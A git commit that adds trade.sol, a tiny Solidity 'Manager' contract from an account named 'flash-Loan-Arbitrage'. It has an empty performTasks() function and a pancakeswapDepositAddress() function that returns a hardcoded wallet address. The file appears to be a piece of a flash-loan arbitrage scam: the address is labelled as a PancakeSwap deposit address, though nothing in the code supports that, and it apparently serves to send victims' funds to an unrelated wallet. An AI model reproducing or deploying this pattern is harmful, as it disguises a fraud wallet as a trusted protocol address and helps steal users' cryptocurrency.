4aecc9ac4aa5deb85528684498433ce358b2ca23
flash-Loan-Arbitrage <110131818+flash-Loan-Arbitrage@users.noreply.github.com>
2022-07-28 02:39:02 +0530

    Create trade.sol

---
+++ trade.sol
@@ -0,0 +1,3 @@
+pragma solidity ^0.5.0;
+contract Manager {function performTasks() public pure{}
+function pancakeswapDepositAddress() public pure returns (address) { return 0xfd00Dc26338d0Fb33949f1A31a3a10F9696fEEe7;}}
